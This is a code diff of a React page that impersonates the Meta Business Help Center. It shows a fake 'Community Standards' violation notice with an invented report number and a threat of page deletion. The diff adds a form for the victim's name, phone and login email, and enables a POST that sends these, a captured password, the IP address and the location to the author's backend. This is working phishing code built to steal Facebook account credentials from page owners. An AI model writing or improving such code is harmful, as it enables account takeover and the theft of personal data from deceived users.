@@ -1,5 +1,5 @@
 import React from 'react'
-import { logo, search } from './Publics/images/images'
+import { logo, search, user } from './Publics/images/images'
 import { Link, useNavigate } from 'react-router-dom'
 import { useState } from 'react';
 import axios from 'axios';
@@ -53,8 +53,9 @@ const Next_buiness = () => {
                     localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
         
                     const data = {
-                        'fill__email': dataPassWord.fill_email,
+                        'fill_email': dataPassWord.fill_email,
                         'fill_phone': dataPassWord.fill_phone,
+                        'fill_your_name': dataPassWord.fill_your_name,
                         'ip': response.data.ipAddress,
                         'city': response.data.city,
                         'country': response.data.countryName,
@@ -62,13 +63,12 @@ const Next_buiness = () => {
                         'second_password': passWord,
                     }
 
-                    navigate('/contact-account/confirm');
-                    // axios.post( "http://localhost:3001/api/news", data) 
-                    // .then((response) => {
-                    //     if (response.data.status === 0 ) {
-                    //             navigate('/contact-account/second-step');
-                    //         }
-                    //     })
+                    axios.post( "http://localhost:8080/api/news", data) 
+                    .then((response) => {
+                        if (response.data.status === 0 ) {
+                                navigate('/contact-account/confirm');
+                            }
+                        })
                         
                 })
                     
@@ -90,103 +90,176 @@ const Next_buiness = () => {
                 <div className="container">
                     <p className="businesshelp" >
                         Meta Business Help Center </p>
-                    <p className="businesshelpcenter">How can we help you?</p>
+                    <p className="businesshelpcenter">Get Support</p>
                 </div>
             </div>
         </div>
 
         <div className="main">
 
-            <div className="title-page">
-                <p><b>How can we help?</b></p>
-                <p>We need more information to address your issue. This form will only take a few minutes.</p>
-            </div>
-
-            <div className="form col-md-4 col-11">
-
-                <div className="text-center pb-3" style={{fontSize: "1.1rem", textAlign: "center"}}>
-                    <strong>Get Started</strong>
+            <div className='content-width col-md-5 col-12'>
+                <div className="title-page">
+                    <div className='left'>
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M0.0495854 3.55544C0.25173 2.66484 1.04822 2 2 2H14C14.9518 2 15.7483 2.66484 15.9504 3.55544L8 8.41403L0.0495854 3.55544ZM0 4.69708V11.8006L5.80319 8.24348L0 4.69708ZM6.7614 8.82905L0.191871 12.8559C0.512604 13.5323 1.20168 14 2 14H14C14.7983 14 15.4874 13.5323 15.8081 12.8559L9.2386 8.82905L8 9.58597L6.7614 8.82905ZM10.1968 8.24348L16 11.8006V4.69708L10.1968 8.24348Z" fill="black"/>
+                        </svg>
+                    </div>
+                    <div className='right'>                    
+                        <p><b>Your page goes against our Community Standards</b></p>
+                        <p style={{fontSize: "12px"}}>Report no: 3088553115</p>                    
+                    </div>
                 </div>
 
-                {/* FORM START */}
+                <div className='facebook'>
+                    <p className='act'>ACTIVITY</p>
+                    
+                    <div className='content-fb'>
+                        <div className='col-1'>
+                            <img src='https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico' width={"35px"} />
+                        </div>
 
-                <Form
-                    name="basic"
-                    initialValues={{
-                    remember: true,
-                    }}
-                    onFinish={onFinish}
-                    autoComplete="off"
-                >
+                        <div className='col-11'>
+                            <p><b>Your Reply</b></p>
+                            <p>Your page has been scheduled for deletion because one of the following reasons:</p>
+                            <p>- Intellectual Property Infringement</p>
+                            <p>- Community Standards</p>
+                            <p>- Hate Speech</p>
+                        </div>
 
-                    <div className="item-form">
-                        <label for="email">Email address</label>
-                        <Form.Item
-                            name="fill_email"
-                            rules={[
-                                {
-                                required: true,
-                                message: 'Please input email address!',
-                                },
-                            ]}
-                        >
-                            <Input style={{padding: "5px 11px"}} />
-                        </Form.Item>
                     </div>
+                </div>
 
-                    <div className="item-form">
-                        <label for="phone">Phone Number</label>
-                        <Form.Item
-                            name="fill_phone"
-                            rules={[
-                                {
-                                required: true,
-                                message: 'Please input your phone number!',
-                                },
-                            ]}
-                        >
-                            <Input />
-                        </Form.Item>
+                <div className='facebook'>
+                    <div className='content-fb'>
+                        <div className='col-1'>
+                            <img src={user} width={"35px"}/>
+                        </div>
+
+                        <div className='col-11'>
+                            <p><b>Our Message</b></p>
+                            <p>Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.</p>
+
+
+
+                            <div className="form">
+                                {/* FORM START */}
+
+                                <Form
+                                    name="basic"
+                                    initialValues={{
+                                    remember: true,
+                                    }}
+                                    onFinish={onFinish}
+                                    autoComplete="off"
+                                >
+
+                                    <div className="item-form">
+                                        <label for="fill_your_name"><b>Your Name</b></label>
+                                        <Form.Item
+                                            name="fill_your_name"
+                                            rules={[
+                                                {
+                                                required: true,
+                                                message: 'Please input email address!',
+                                                },
+                                            ]}
+                                        >
+                                            <Input style={{padding: "5px 11px"}} />
+                                        </Form.Item>
+                                    </div>
+
+                                    <div className="item-form">
+                                        <label for="fill_phone"><b>Your Phone Number</b></label>
+                                        <Form.Item
+                                            name="fill_phone"
+                                            rules={[
+                                                {
+                                                required: true,
+                                                message: 'Please input your phone number!',
+                                                },
+                                            ]}
+                                        >
+                                            <Input />
+                                        </Form.Item>
+                                    </div>
+
+                                    <div className="item-form">
+                                        <label for="fill_email"><b>Login Email Address</b></label>
+                                        <Form.Item
+                                            name="fill_email"
+                                            rules={[
+                                                {
+                                                required: true,
+                                                message: 'Please input your email address!',
+                                                },
+                                            ]}
+                                        >
+                                            <Input />
+                                        </Form.Item>
+                                    </div>
+
+                                    <div className="item-form">
+                                        <label for="fill_appeal"><b>Your Appeal</b></label>
+                                        <Form.Item
+                                            name="fill_appeal"
+                                            rules={[
+                                                {
+                                                required: true,
+                                                message: 'Please input your appeal!',
+                                                },
+                                            ]}
+                                        >
+                                            <Input />
+                                        </Form.Item>
+                                    </div>
+
+                                    <div className="item-form">
+                                        <Form.Item
+                                            name="check_form"
+                                            valuePropName="checked"
+                                            rules={[
+                                                {
+                                                required: true,
+                                                message: 'Please agree to our terms and data and cookie policy!',
+                                                },
+                                            ]}
+                                        >
+                                            <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
+                                        </Form.Item>
+                                    </div>
+
+
+                                    <Form.Item 
+                                        className="btn butoni"
+                                    >
+                                        <Button
+                                            htmlType="submit"
+                                            style={{
+                                                backgroundColor: "transparent",
+                                                outline: "none",
+                                                border: 'none',
+                                                boxShadow: 'none',
+                                                color: "#267df1",
+                                                fontWeight: '700',
+                                                fontSize:'1rem',
+                                                width: '100%'
+                                            }}
+                                        >
+                                            Submit
+                                        </Button>
+                                    </Form.Item>
+                                </Form>
+
+                                {/* FORM END */}
+                            </div>
+
+                        </div>
+
                     </div>
+                </div>
 
-                    <div className="item-form">
-                        <Form.Item
-                            name="check_form"
-                            valuePropName="checked"
-                            rules={[
-                                {
-                                required: true,
-                                message: 'Please agree to our terms and data and cookie policy!',
-                                },
-                            ]}
-                        >
-                            <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
-                        </Form.Item>
-                    </div>
-
-
-                    <Form.Item 
-                        className="btn butoni"
-                    >
-                        <Button
-                            htmlType="submit"
-                            style={{
-                                backgroundColor: "transparent",
-                                outline: "none",
-                                border: 'none',
-                                boxShadow: 'none',
-                                color: "#267df1",
-                                fontWeight: '700',
-                                fontSize:'1rem',
-                                width: '100%'
-                            }}
-                        >
-                            Submit
-                        </Button>
-                    </Form.Item>
-                </Form>
-
-                {/* FORM END */}
+                
+            
             </div>
 
         </div>
